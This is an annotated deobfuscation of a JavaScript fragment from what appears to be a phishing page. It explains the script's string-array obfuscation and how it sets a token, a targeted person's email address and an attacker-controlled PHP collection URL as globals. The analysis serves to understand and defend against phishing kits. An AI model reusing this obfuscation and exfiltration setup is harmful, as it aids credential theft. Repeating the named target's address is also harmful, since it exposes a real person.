/**
This whole script only does the following:
window.ok = ""
window.incr = ""
window.token = "ZlGZnmTtp7wJI8SoFVdzu2NvF"
window.mail = "chuck@hslda.org"
window.file = "https://datplast.com/images/V1.3.4.php"
 */


var tokenArray = ["74706uhIMzb", "mail", "32ZnmeCY", "token", "24pWUbVW", "test", "112cpUxDh", 
  "745947AIcuKD", "529796hUvzBk", "incr", "1041258CCcAHf", "length", "6658530ppScsV", 
  "651565BDQDQi", "file", "27039SckinC", "COMVb"]

function getToken(index) {
  return tokenArray[index]
}

// shuffles the tokenArray until it becomes:
// ["112cpUxDh","745947AIcuKD","529796hUvzBk","incr","1041258CCcAHf","length","6658530ppScsV","651565BDQDQi","file","27039SckinC","COMVb","74706uhIMzb","mail","32ZnmeCY","token","24pWUbVW","test"]
//
// the method uses parseInt which ignores the letters at the end of the strings that start with numbers and converts the numbers into a number data type
// the resulting numbers are then added, subtracted, multiplied and divided into the final number that once the array is in the desired sequence finally equals 339979 and the algorithm stops
// when the try catch is used for when words get passed into parseInt and NaN is attempted to be divided by a number and the evaluation breaks
// the evaluation breaking causes the whole array to shift once, pushing the first item to the back (which happens either way until the loop is finished)
(function () {
  while (true) {
    try {
      var n = -parseInt(getToken(2)) + 
        parseInt(getToken(4)) / 2 + 
        -parseInt(getToken(9)) / 3 * 
        (parseInt(getToken(15)) / 4) + 
        -parseInt(getToken(7)) / 5 + 
        parseInt(getToken(11)) / 6 * 
        (parseInt(getToken(0)) / 7) + 
        -parseInt(getToken(13)) / 8 * 
        (parseInt(getToken(1)) / 9) + 
        parseInt(getToken(6)) / 10;
      if (n === 339979) break; else tokenArray.push(tokenArray.shift());
    } catch (e) {
      tokenArray.push(tokenArray.shift());
    }
  }
})()


function isBase64(input) {
  // checks if the length of the input matches that of a base64 encoded string and the input is alphanumeric with the exception of = symbols
  return (input[getToken(5)] % 4 == 0) && /^[A-Za-z0-9+/]+[=]{0,2}$/[getToken(16)](input);
  // this method will really only work against urls being base64 encoded. It's a horrible and broken method for testing pretty much any other string
}

window.ok = ""
window[getToken(3)] = ""
window[getToken(14)] = FG9952 // ZlGZnmTtp7wJI8SoFVdzu2NvF
window[getToken(12)] = HY8740 // user's email address

// sets window.file to the global variable BH8710 (in this case https://datplast.com/images/V1.3.4.php) which is set outside of this script
isBase64(BH8710) ? window[getToken(8)] = atob(BH8710) : window[getToken(8)] = BH8710;
// this line checks to see if the URL from the global variable is base64 and decodes it if it is so
// this means that the script was built to support multiple modes and the more obfuscated method was not used
// which means that either original creator of this script is not the person who launched this attack or he has used this multiple times and strangly chose not to use the slightly less obfuscated method
